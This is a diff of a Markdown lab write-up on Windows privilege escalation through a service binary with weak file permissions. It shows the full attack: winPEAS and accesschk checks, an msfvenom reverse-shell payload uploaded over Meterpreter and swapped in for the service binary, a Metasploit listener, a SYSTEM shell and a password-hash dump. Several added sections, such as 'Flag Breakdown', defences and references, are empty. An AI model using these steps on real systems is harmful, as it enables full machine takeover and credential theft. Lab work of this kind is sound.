@@ -8,75 +8,26 @@
 
 ## Table of Contents
 
-- [Introduction](#introduction)
-- [Why This Attack Works](#why-this-attack-works)
-- [Lab Setup](#lab-setup)
-- [What I Needed Before Starting](#what-i-needed-before-starting)
-- [What I Understood During the Process](#what-i-understood-during-the-process)
-- [Attack Flow](#attack-flow)
-- [Step 1 — Running winPEAS to Find the Vulnerable Service](#step-1--running-winpeas-to-find-the-vulnerable-service)
-- [Step 2 — Checking the Service Configuration](#step-2--checking-the-service-configuration)
-- [Step 3 — Checking Binary File Permissions with accesschkexe](#step-3--checking-binary-file-permissions-with-accesschkexe)
-- [Step 4 — Backing Up the Original Service Binary](#step-4--backing-up-the-original-service-binary)
-- [Step 5 — Uploading the Payload and Replacing the Service Binary](#step-5--uploading-the-payload-and-replacing-the-service-binary)
-- [Step 6 — Getting a SYSTEM Shell](#step-6--getting-a-system-shell)
-- [How Defenders Can Catch This](#how-defenders-can-catch-this)
-- [How to Prevent It](#how-to-prevent-it)
-- [What I Achieved](#what-i-achieved)
+* [Introduction](#introduction)
+* [Attack Flow](#attack-flow)
+* [Why This Attack Works](#why-this-attack-works)
+* [Lab Setup](#lab-setup)
+* [Tools Used](#tools-used)
+* [Prerequisites](#prerequisites)
+* [Step 1 — Running winPEAS to Find the Vulnerable Service](#step-1--running-winpeas-to-find-the-vulnerable-service)
+* [Step 2 — Checking the Service Configuration](#step-2--checking-the-service-configuration)
+* [Step 3 — Checking Binary File Permissions with accesschkexe](#step-3--checking-binary-file-permissions-with-accesschkexe)
+* [Step 4 — Backing Up the Original Service Binary](#step-4--backing-up-the-original-service-binary)
+* [Step 5 — Uploading the Payload and Replacing the Service Binary](#step-5--uploading-the-payload-and-replacing-the-service-binary)
+* [Step 6 — Getting a SYSTEM Shell](#step-6--getting-a-system-shell)
+* [How Defenders Can Catch This](#how-defenders-can-catch-this)
+* [How to Prevent It](#how-to-prevent-it)
+* [References](#references)
+* [Lessons Learned](#lessons-learned)
 
 ## Introduction
 
 File Permission Service is a local privilege escalation technique. The idea is simple — when a Windows service binary has weak file permissions, a low privilege user can replace the real binary with a malicious one. When the service starts, it runs the malicious binary as SYSTEM — giving full control of the machine without needing any exploit or CVE.
-
-## Why This Attack Works
-
-Windows services often run as SYSTEM. If the actual binary file that the service runs has weak permissions — meaning normal users can overwrite it — I can swap it out with my own payload. The next time the service starts, Windows runs my file thinking it is the real one, and I get a SYSTEM shell.
-
-## Lab Setup
-
-```
-|   Component      |         Details          |
-|------------------|--------------------------|
-| Attacker Machine | Kali Linux               |
-| Attacker IP      | `192.168.5.128`          |
-| Victim Machine   | Windows 10 (MSEDGEWIN10) |
-| Victim IP        | `192.168.5.144`          |
-| Network          | VMware Host-Only Network |
-| Domain           | WORKGROUP                |
-```
-
-## Tools Prepared on Kali Before Starting
-
-```
-|        Tool      |          Location         |         Purpose                            |
-|------------------|---------------------------|--------------------------------------------|
-| winPEASany.exe   | /home/kali/Desktop/tools/ | Find privilege escalation paths.           |
-| accesschk.exe    | /home/kali/Desktop/tools/ | Check file and service permissions.        |
-| rev.exe          | /home/kali/Desktop/       | Malicious payload generated with `msfvenom`|
-| Metasploit       | Built into Kali           | Catch reverse shells.                      |
-```
-
-## What I Needed Before Starting
-
-```
-|         What                      |                          Why                            |
-|-----------------------------------|---------------------------------------------------------|
-| Low-privilege shell on the victim | Starting point for the privilege escalation attack.     |
-| winPEAS                           | To identify services with weak binary file permissions. |
-| accesschk.exe                     | To verify the permissions on the service executable.    |
-| msfvenom                          | To generate the malicious payload.                      |
-| Metasploit                        | To receive the reverse Meterpreter session.             |
-```
-
-## What I Understood During the Process
-
-While working through this attack I realized that:
-
-- Weak file permissions on a service binary are just as dangerous as weak service config permissions
-- If Everyone or BUILTIN\Users has FILE_ALL_ACCESS on a service binary — that machine is wide open
-- Backing up the original binary before replacing it is important so the service does not break permanently
-- Once you have a SYSTEM Meterpreter session, you can dump all password hashes from the machine in one command
-- This kind of misconfiguration is very easy to miss during system setup
 
 ## Attack Flow
 
@@ -108,6 +59,37 @@ whoami → nt authority\system
 Ran hashdump — dumped all password hashes from the machine
 ```
 
+## Why This Attack Works
+
+Windows services often run as SYSTEM. If the actual binary file that the service runs has weak permissions — meaning normal users can overwrite it — I can swap it out with my own payload. The next time the service starts, Windows runs my file thinking it is the real one, and I get a SYSTEM shell.
+
+## Lab Setup
+
+|   Component      |         Details          |
+|------------------|--------------------------|
+| Attacker Machine | Kali Linux               |
+| Attacker IP      | `192.168.5.128`          |
+| Victim Machine   | Windows 10 (MSEDGEWIN10) |
+| Victim IP        | `192.168.5.144`          |
+| Network          | VMware Host-Only Network |
+| Domain           | WORKGROUP                |
+
+## Tools Used
+
+|        Tool      |          Location         |         Purpose                            |
+|------------------|---------------------------|--------------------------------------------|
+| `winPEASany.exe`   | /home/kali/Desktop/tools/ | Find privilege escalation paths.           |
+| `accesschk.exe`    | /home/kali/Desktop/tools/ | Check file and service permissions.        |
+| `rev.exe`          | /home/kali/Desktop/       | Malicious payload generated with `msfvenom`|
+| `Metasploit`       | Built into Kali           | Catch reverse shells.                      |
+
+## Prerequisites
+
+
+
+
+
+
 
 ## Step 1 — Running winPEAS to Find the Vulnerable Service
 
@@ -136,6 +118,11 @@ After finding the vulnerable service with **winPEAS**, I checked its configurati
 ```bash
 C:\PrivEsc> sc qc filepermsvc
 ```
+**Flag Breakdown**
+
+
+
+
 **Output:**
 
 ```
@@ -165,6 +152,17 @@ To make sure I could replace the service executable, I checked its file permissi
 ```bash
 .\accesschk.exe /accepteula -uwqv "C:\Program Files\File Permissions Service\filepermservice.exe"
 ```
+
+**Flag Breakdown**
+
+
+
+
+
+
+
+
+
 **Output:**
 
 ```
@@ -195,6 +193,12 @@ Before replacing the real binary, I backed it up to `C:\temp` so I could restore
 ```bash
 copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\temp
 ```
+**Flag Breakdown**
+
+
+
+
+
 **Output:**
 
 ```
@@ -206,13 +210,15 @@ copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\temp
 
 ## Step 5 — Uploading the Payload and Replacing the Service Binary
 
-### Upload rev.exe from Kali
+### Uploaded rev.exe from Kali
 
 I had already created a payload named `rev.exe` using **msfvenom**. I uploaded it from my Kali machine to the victim using Meterpreter.
 
 ```bash
 meterpreter > upload /home/kali/Desktop/rev.exe
 ```
+**Output:**
+
 ```
 [*] Uploading  : /home/kali/Desktop/rev.exe -> rev.exe
 [*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/kali/Desktop/rev.exe -> rev.exe
@@ -222,7 +228,7 @@ meterpreter > upload /home/kali/Desktop/rev.exe
   <img src="images/step5-1.png" width="600">
 </p>
 
-### Start Metasploit Listener on Kali
+### Started Metasploit Listener on Kali
 
 ```bash
 msfconsole -q
@@ -241,11 +247,18 @@ run
   <img src="images/step5-2.png" width="600">
 </p>
 
-### Replac the Real Binary with My Payload
+### Replaced the Real Binary with My Payload
 
 ```bash
 C:\PrivEsc> copy C:\PrivEsc\rev.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
 ```
+**Flag Breakdown**
+
+
+
+
+
+**Output:**
 
 ```
 Overwrite C:\Program Files\File Permissions Service\filepermservice.exe? (Yes/No/All): Yes
@@ -258,11 +271,17 @@ The real filepermservice.exe was replaced with my rev.exe. Next time the service
   <img src="images/step5-3.png" width="600">
 </p>
 
-### Start the Service
+### Started the Service
 
 ```bash
 C:\PrivEsc> net start filepermsvc
 ```
+**Flag Breakdown**
+
+
+
+
+
 ## Step 6 — Getting a SYSTEM Shell
 
 ### Metasploit Caught the Connection
@@ -271,10 +290,29 @@ C:\PrivEsc> net start filepermsvc
 [*] Sending stage (230982 bytes) to 192.168.5.129
 [*] Meterpreter session 1 opened (192.168.5.128:4444 → 192.168.5.144:49922) at 2026-01-19 12:16:34
 ```
-### Check Privileges
+### Checked Privileges
 
 ```bash
 C:\Windows\system32> whoami
 nt authority\system
 ```
 I went from a normal low privilege user to `nt authority\system` just by replacing a service binary that anyone could overwrite. The attack was successful.
+
+## How Defenders Can Catch This
+
+
+## How to Prevent It
+
+
+## References
+
+
+## Lessons Learned
+
+While working through this attack I realized that:
+
+- Weak file permissions on a service binary are just as dangerous as weak service config permissions
+- If Everyone or BUILTIN\Users has FILE_ALL_ACCESS on a service binary — that machine is wide open
+- Backing up the original binary before replacing it is important so the service does not break permanently
+- Once you have a SYSTEM Meterpreter session, you can dump all password hashes from the machine in one command
+- This kind of misconfiguration is very easy to miss during system setup
